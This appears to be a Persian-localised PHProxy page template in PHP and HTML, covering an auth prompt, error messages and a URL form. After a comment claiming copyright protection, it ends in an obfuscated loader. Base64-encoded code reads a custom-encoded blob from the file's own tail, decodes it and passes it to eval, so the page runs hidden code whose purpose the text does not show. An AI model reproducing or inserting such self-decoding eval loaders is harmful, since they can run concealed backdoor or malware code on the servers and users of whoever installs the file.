<?php 

if (basename(__FILE__) == basename($_SERVER['PHP_SELF']))
{
    exit(0);
}

echo '<?xml version="1.0" encoding="utf-8"?>';


?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">


<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" 

xml:lang="en-US">
<head>

  <title>PHProxy</title>

  <link rel="stylesheet" type="text/css" href="style.css" title="Default Theme" media="all" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"></head>
<body onload="document.getElementById('address_box').focus()">
<div align="center"><img src="http://irteam1985.googlepages.com/Proxy_logo.jpg" />
</div>
<div id="container">
 <!-- <h1 id="title">PHProxy</h1> -->
  <ul id="navigation">
     <li><a href="<?php echo $GLOBALS['_script_base'] ?>">باز آوري پروكسي</a></li>
    <li><a href="javascript:alert('مديريت كوكي ها هنوز تكميل نشده است')">مديريت كوكي ها</a></li>

  </ul>
<?php

switch ($data['category'])
{
    case 'auth':
?>
  <div id="auth"><p>
  <b>كلمه عبور را براي "<?php echo htmlspecialchars($data['realm']) ?>" در سايت <?php echo $GLOBALS['_url_parts']['host'] ?>وارد كنيد.</b>
  <form method="post" action="">
    <input type="hidden" name="<?php echo $GLOBALS['_config']['basic_auth_var_name'] ?>" value="<?php echo base64_encode($data['realm']) ?>" />
    <label>نام كاربر <input type="text" name="username" value="" /></label> <label>كلمه عبور <input type="password" name="password" value="" /></label> <input id="forgetful" type="submit" value="ورود" />
  </form></p></div>
<?php
        break;
    case 'error':
        echo '<div id="error"><p>';
        
        switch ($data['group'])
        {
            case 'url':
                echo '<b>خطا در آدرس (' . $data['error'] . ')</b>: ';
                switch ($data['type'])
                {
                    case 'internal':
                        $message = 'عدم موفقيت در اتصال به هاست مورد نظر. '
                                 . ' مشكلات احتمالي عبارتند از:<BR>'
                                 . ' "server was not found", "connection timed out" يا "connection refused by the host"<BR>'
								 . 'مجددا سعي به اتصال كنيد و چك كنيد آدرس را صحيح وارد كرده ايد.';
                        break;
                    case 'external':
                        switch ($data['error'])
                        {
                            case 1:
                                $message = 'آدرسي كه شما سعي به دسترسي به آن داريد در ليست سياه سرور قرار دارد. لطفا يك آدرس ديگر را انتخاب كنيد.';
                                break;
                            case 2:
                                $message = 'آدرسي كه شما وارد كرده ايد غير عادي است. لطفا چك كنيد كه آدرس را صحيح وارد كرده ايد.';
                                break;
                        }
                        break;
                }
                break;
            case 'resource':
                echo '<b>Resource Error:</b> ';
                switch ($data['type'])
                {
                    case 'file_size':
                        $message = 'حجم فايلي كه شما سعي در دريافت آن داريد خيلي زياد است.<br />'
                                 . 'بيشترين حجم مجاز براي فايل بايد <b>' . number_format($GLOBALS['_config']['max_file_size']/1048576, 2) . 'مگا بايت باشد.</b><br />'
                                 . 'حجم فايل درخواستي شما <b>' . number_format($GLOBALS['_content_length']/1048576, 2) . ' مگابايت است.</b>';
                        break;
                    case 'hotlinking':
                        $message = 'به نظر ميرسد شما قصد دسترسي به محتويات يك سرور را از طريق اين سيستم به وسيله ي يك remote Website داريد.<br />';
                        break;
                }
                break;
        }
        
        echo '<b> خطا هنگام استفاده از پروكسي </b> <br />' . $message . '</p></div>';
        break;
}
?>
  <form method="post" action="<?php echo $_SERVER['PHP_SELF'] ?>">
    <ul id="form">
      <li id="address_bar">
        <label>آدرس:    
        <input id="address_box" type="text" name="<?php echo $GLOBALS['_config']['url_var_name'] ?>" value="<?php echo isset($GLOBALS['_url']) ? htmlspecialchars($GLOBALS['_url']) : '' ?>" onfocus="this.select()" /></label> <input id="go" type="submit" value="نمايش سايت" /></li>
      <?php
      
      foreach ($GLOBALS['_flags'] as $flag_name => $flag_value)
      {
          if (!$GLOBALS['_frozen_flags'][$flag_name])
          {
              echo '<li class="option"><label><input type="checkbox" name="' . $GLOBALS['_config']['flags_var_name'] . '[' . $flag_name . ']"' . ($flag_value ? ' checked="checked"' : '') . ' />' . $GLOBALS['_labels'][$flag_name][1] . '</label></li>' . "\n";
          }
      }
	  ?>
    </ul>
  </form>
  <!-- The least you could do is leave this link back as it is. This software is provided for free and I ask nothing in return except that you leave this link intact
       You're more likely to recieve support should you require some if I see a link back in your installation than if not -->
<?php // This file is protected by copyright law and provided under license. Reverse engineering of this file is strictly prohibited.
$OOO0O0O00=__FILE__;$O00O00O00=__LINE__;$OO00O0000=324;eval((base64_decode('JE8wMDBPME8wMD1mb3BlbigkT09PME8wTzAwLCdyYicpO3doaWxlKC0tJE8wME8wME8wMClmZ2V0cygkTzAwME8wTzAwLDEwMjQpO2ZnZXRzKCRPMDAwTzBPMDAsNDA5Nik7JE9PMDBPMDBPMD0oYmFzZTY0X2RlY29kZShzdHJ0cihmcmVhZCgkTzAwME8wTzAwLDM3MiksJ2RocS9vcjNCOUZrMnpBUXB5aThzREN1dHZJYjZWRzFnRUtKd0xUNFd4VUgwUjVQWlNhWVhObStPbGM3TWZqZW49JywnQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkrLycpKSk7ZXZhbCgkT08wME8wME8wKTs=')));return;?>
Fojpz/hpz/hpz/mTV4CWtOFTV3aKv+DxFmjgiLTziCjgFYSJFY9PFojpsXhpzofSzqlJFY9Rk3FKV+D+ArjLIuAZI3DxVOiYGB9xIWFTvuyxFofSz/hpzofSzqSLsNfSzofSz/dSk8SWI3Ka2+jYzN9ci4RY1LriVBTUQBAoyOCNGLTJATIBzuGr8NUOsryNCOKC8/h8AChbD+rIuoc5kNjRvXGAI4UT6wNW2qGhyLAoiDIB8oTk8NaAsLjyDCFsCrCuCmKIu4rJv+iTI4GxbuU063mP6OhaVWANGtIO1BT7z/oYzXymAwVlQ8RZFYLUk8LMI4AR6OATkqipz/dSsXhpz/dUQ+C+vuSxFojpz/hpz/hpzqLMIuAx6YdW9/aLbtvEbuyj94IZ6OiTVJ9e9qdfI4jPGqhw6+aZVwNJ9XLciLI3iJ9EV+T7IsNJz89eD3jOItFTIqhJ18d79/aK93KYIuvj94KNGBd72YjOGOVPG+KUG3C41tFT24AZ68fJ9BiKV4GTG/NJt+FRvuc09wcy8rhY6OKc9/SZvslS2wCJzwaJVwcDV4rPV+aKG3CL9qvEsujLbuIUIuyE93Fc9/xEp3oEbBFTIwNJ1umXIO97V+CPI3T5p+IZV4GTG3Im6rfYz/dSz/dJpLIZV4GTG3Im6/SZvslf2+IZ6WyepqjLbtve/yxWQS==

</div>
 



</body>
</html>